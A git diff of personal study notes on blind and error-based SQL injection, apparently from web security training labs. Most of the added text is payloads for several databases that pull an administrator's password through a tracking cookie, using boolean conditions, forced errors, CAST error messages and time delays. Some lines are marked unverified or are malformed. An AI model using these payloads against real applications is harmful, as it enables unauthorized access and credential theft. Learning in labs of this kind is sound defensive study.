@@ -201,7 +201,9 @@ Confirm injection:
 tracking_cookie_value'+AND+'1'%3d'1
 ```
 
-The page shows the "Welcome back!" banner
+The page shows the "Welcome back!" banner when Tracking cookie is successfully validated
+
+We can use this to check our query result by adding an AND operator and a boolean expression
 
 Find first letter of the administrator password (only lowercase aphanumeric characters):
 
@@ -209,16 +211,168 @@ Find first letter of the administrator password (only lowercase aphanumeric char
 # Use > and < to find the first character
 tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'m
 tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'5
+
 # Use >= and <= too
 tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>%3d+'0
+
 # Use = to confirm the value is correct
 tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+%3d+'0
+
 # Repeat the process by increasing the index in the SUBSTRING function to find the second character
 tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),2,1)+>+'m
+
 # Repeat ad nauseum
 ```
 
 ### Error-based SQL injection
+
+**Lab: Blind SQL injection with conditional errors**
+
+```
+# Internal server error even when case is false indicates the query syntax is invalid
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+
+# For MSSQL (TODO: verify)
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a
+
+# For PostgreSQL (TODO: verify)
+' AND (SELECT CASE WHEN (1=2) THEN 1/SELECT(0) ELSE 'a' END) = 'a
+
+# For MySQL (TODO: verify)
+' AND (SELECT IF(1=2, (SELECT table_name FROM information_schema.tables), 'a')) = 'a
+
+# 200 OK confirming this is an Oracle DB
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a
+
+# I tried confirming the users table existed but my queries didn't work when using all_tables or all_tab_columns
+# Not sure why, interested to understand
+
+# Confirm administrator user is present in table users (we want a 500)
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a
+
+# Enumerate password for administrator account
+# When our SUBSTR boolean evaluation is true we get a 500
+# i.e if the 1st char of the administrator password is greater than 'm' we'll see an error
+' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a
+
+# Repeat ad nauseum
+
+# Lab solution:
+
+# Using concatenation to validate DB type
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+
+# Check users table is real (ROWNUM = 1 forces only one column to be returned)
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+# Check username is present
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+### Extracting sensitive data via verbose SQL error messages
+
+Verbose error messages can provide information that may be useful to an attacker like the full query and using CAST to deliberately throw errors revealing data
+
+**Lab: Visible error-based SQL injection**
+
+App uses a Tracking cookie which is injectable, exploit this to extract the administrator's password
+
+```
+# Check injection
+TrackingId=as2113FFasdas'
+
+# Check syntax
+TrackingId=as2113FFasdas'--
+
+# Confirm CAST will work
+TrackingId=as2113FFasdas' AND 1=CAST((SELECT 1) as int)--
+
+# Try to retrieve a username
+TrackingId=as2113FFasdas' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--
+
+# Error shows our query was truncated after 60 characters
+# Drop the TrackingId and we get the administrator username
+' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--
+
+# Get the administrator password
+' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--
+```
+
+### Exploiting blind SQL injection by triggering time delays
+
+If the application handles SQL errors gracefully the previous techniques for blind SQLi won't work.
+
+Using time delays allows us to check the truth of an injected query by monitoring HTTP response times
+
+```
+# MSSQL
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+# MySQL
+'; IF (1=2) SELECT SLEEP(10)#
+'; IF (1=1) SELECT SLEEP(10#
+'; IF (1=2) SELECT SLEEP(10)-- <- Space!
+'; IF (1=1) SELECT SLEEP(10)-- <- Space!
+
+# Oracle
+'; IF (1=2) dbms_pipe.receive_message(('a'),10)--
+'; IF (1=1) dbms_pipe.receive_message(('a'),10)--
+
+# PostgreSQL
+';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+'||pg_sleep(10)--
+```
+
+**Lab: Blind SQL injection with time delays**
+
+App uses a Tracking cookie which is injectable, exploit this to introduce a 10 second time delay
+
+```
+# Try with MSSQL
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+' AND IF (1=2) WAITFOR DELAY '0:0:10'--
+' AND IF (1=1) WAITFOR DELAY '0:0:10'--
+'||WAITFOR DELAY '0:0:10'--
+
+# Try with MySQL
+'; IF (1=2) SELECT SLEEP(10)#
+'; IF (1=1) SELECT SLEEP(10)#
+'; IF (1=2) SELECT SLEEP(10)-- <- Space included!
+'; IF (1=1) SELECT SLEEP(10)-- <- Space included!
+' AND IF (1=2) SELECT SLEEP(10)#
+' AND IF (1=1) SELECT SLEEP(10)#
+' AND IF (1=2) SELECT SLEEP(10)-- <- Space included!
+' AND IF (1=1) SELECT SLEEP(10)-- <- Space included!
+'||SLEEP(10)#
+'||SLEEP(10)-- <- Space included!
+
+# Try with Oracle
+'; IF (1=2) dbms_pipe.receive_message(('a'),10)--
+'; IF (1=1) dbms_pipe.receive_message(('a'),10)--
+' AND IF (1=2) dbms_pipe.receive_message(('a'),10)--
+' AND IF (1=1) dbms_pipe.receive_message(('a'),10)--
+'||dbms_pipe.receive_message(('a'),10)--
+
+# Try with PostgreSQL
+';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+'||pg_sleep(10)--
+
+```
+
+
+
+**Lab: Blind SQL injection with time delays and information retrieval**
+
+App uses a Tracking cookie which is injectable, exploit this to retrieve the administrator's password
+
+```
+';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+```
 
 ## Second-order SQL injection AKA Stored SQL injection
 
